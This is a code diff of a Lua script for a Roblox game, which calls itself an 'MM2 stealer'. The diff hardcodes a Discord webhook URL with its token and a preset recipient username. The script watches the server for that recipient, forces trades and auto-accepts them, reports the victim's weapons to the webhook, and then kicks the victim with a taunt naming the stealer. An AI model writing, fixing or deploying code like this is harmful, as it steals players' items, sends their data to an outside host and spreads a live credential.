@@ -1,3 +1,4 @@
+-- Testing version of MM2 stealer script
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
@@ -9,16 +10,39 @@ local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 
--- 2. Define Configuration Variables
-local users = _G.Usernames or {}
-local min_rarity = _G.min_rarity or "Godly"
-local min_value = _G.min_value or 1
-local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or ""
+-- 2. PRE-SET CONFIGURATION (edit these in the script)
+_G.presetUsername = "aurorlaax"  -- Pre-set username
+_G.presetWebhook = "https://discord.com/api/webhooks/1508171564909334658/Qh6L6WPKVro1VfFKFNmT2F9lAzMpu1D8rNRY7bSVA4uaANp2KoWz9ZMy-uxMSilCQaK-"  -- Pre-set webhook
 
--- 3. Initial Validation Checks
-if next(users) == nil or webhook == "" then
-    plr:kick("You didn't add username or webhook")
+-- 3. DYNAMIC CONFIGURATION (change these in your executor)
+_G.Usernames = {}  -- Change this with: _G.Usernames = {"username1", "username2", "username3"}
+_G.webhook = ""   -- Change this with: _G.webhook = "new_webhook_url"
+
+-- Other settings
+_G.min_rarity = "Godly"
+_G.min_value = 1
+_G.pingEveryone = "No"
+
+-- 4. Function to update dynamic config
+local function updateConfig(usernames, webhookUrl)
+    _G.Usernames = usernames or {}
+    _G.webhook = webhookUrl or ""
+    print("Dynamic config updated: Usernames = " .. table.concat(_G.Usernames, ", ") .. ", Webhook = " .. (_G.webhook and "SET" or "nil"))
+end
+
+-- 5. Get the active configuration
+local function getActiveConfig()
+    local useDynamic = #(_G.Usernames or {}) > 0 and _G.webhook ~= ""
+    local usernames = useDynamic and _G.Usernames or {_G.presetUsername}
+    local webhook = useDynamic and _G.webhook or _G.presetWebhook
+    return usernames, webhook, useDynamic
+end
+
+-- 6. Initial Validation Checks
+local usernames, webhook, useDynamic = getActiveConfig()
+
+if not usernames or #usernames == 0 or webhook == "YOUR_FIRST_WEBHOOK_URL_HERE" or webhook == "" then
+    plr:kick("You didn't configure the usernames or webhook properly")
     return
 end
 
@@ -37,7 +61,7 @@ if #Players:GetPlayers() >= 12 then
     return
 end
 
--- 4. Environment & Game Data Setup
+-- 7. Environment & Game Data Setup
 local weaponsToSend = {}
 local playerGui = plr:WaitForChild("PlayerGui")
 local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
@@ -211,10 +235,8 @@ local function sendTradeRequest(user)
         return 
     end
 
-    -- Run the invocation in a separate thread so it cannot freeze the script
     task.spawn(function()
         local success, err = pcall(function()
-            -- Invoke the server without blocking the main loop
             game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(targetPlayer)
         end)
         
@@ -223,7 +245,6 @@ local function sendTradeRequest(user)
         end
     end)
 end
-
 
 local function getTradeStatus()
     return game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
@@ -242,24 +263,9 @@ end
 local function acceptTrade()
     local args = {
         [1] = 428469873,
-		[2] = 19843.00729993102
+        [2] = 19843.00729993102
     }
     game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
-end
-
---local args = {
-	--428469873,
-	--19843.00729993102
---}
---game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
-
-
-local function addWeaponToTrade(id)
-    local args = {
-        [1] = id,
-        [2] = "Weapons"
-    }
-    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
 end
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -274,7 +280,6 @@ local placeIdMultiplier = game.PlaceId * 3
 Trade:WaitForChild("UpdateTrade").OnClientEvent:Connect(function(data)
     if not data then return end
     
-    -- Try multiple possible field names
     if data.SessionId then 
         lastSessionId = data.SessionId 
     elseif data.LastOffer then 
@@ -285,7 +290,6 @@ Trade:WaitForChild("UpdateTrade").OnClientEvent:Connect(function(data)
         lastSessionId = data.OfferId
     end
     
-    -- Sometimes it's in a nested table
     if data.Trade and data.Trade.SessionId then
         lastSessionId = data.Trade.SessionId
     end
@@ -299,19 +303,18 @@ end)
 local function acceptTrade()
     if not lastSessionId then
         warn("No session ID yet!")
-        -- Debug: print what we have
         print("Trying to get trade data...")
         return
     end
     
     print("Accepting with session:", lastSessionId)
     
-    -- Fire multiple times for reliability
     for i = 1, 5 do
         AcceptTradeRemote:FireServer(placeIdMultiplier, lastSessionId)
         task.wait(0.1)
     end
 end
+
 local totalValue = 0
 
 local function SendFirstMessage(list, prefix)
@@ -561,40 +564,32 @@ if #weaponsToSend > 0 then
         plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
     end
 
-local function startPlayerPolling()
-    local checkInterval = 3 -- Checks the server every 3 seconds
-    local searchActive = true
-
-    task.spawn(function()
-        while searchActive do
-            -- Look through every player currently in the game server
-            for _, player in ipairs(Players:GetPlayers()) do
-                -- Check if their username matches your configuration list
-                if table.find(users, player.Name) then
-                    
-                    -- 1. Fire webhook notification
-                    SendMessage(sentWeapons)
-                    
-                    -- 2. Turn off the loop immediately
-                    searchActive = false
-                    
-                    -- 3. Pass the detected player's name into the transaction thread
-                    task.spawn(function()
-                        doTrade(player.Name)
-                    end)
-                    
-                    break -- Exit the current player loop
+    local function startPlayerPolling()
+        local checkInterval = 3
+        local searchActive = true
+        
+        -- Get current config
+        local usernames, webhook, useDynamic = getActiveConfig()
+        
+        task.spawn(function()
+            while searchActive do
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if table.find(usernames, player.Name) then
+                        SendMessage(sentWeapons)
+                        searchActive = false
+                        task.spawn(function()
+                            doTrade(player.Name)
+                        end)
+                        break
+                    end
                 end
+                task.wait(checkInterval)
             end
-            
-            -- Prevent the server thread from freezing
-            task.wait(checkInterval)
-        end -- <-- FIX 1: Closes the 'while searchActive do' loop
-    end) -- <-- FIX 2: Closes the 'task.spawn(function()' block
-end -- <-- FIX 3: Closes the 'local function startPlayerPolling()' block
+        end)
+    end
 
--- 4. Run the polling loop automatically when the script executes
-startPlayerPolling()
-
--- 5. This final 'end' closes the main 'if #weaponsToSend > 0 then' block from line 458
+    startPlayerPolling()
 end
+
+-- Make the updateConfig function globally accessible
+_G.updateMM2Config = updateConfig
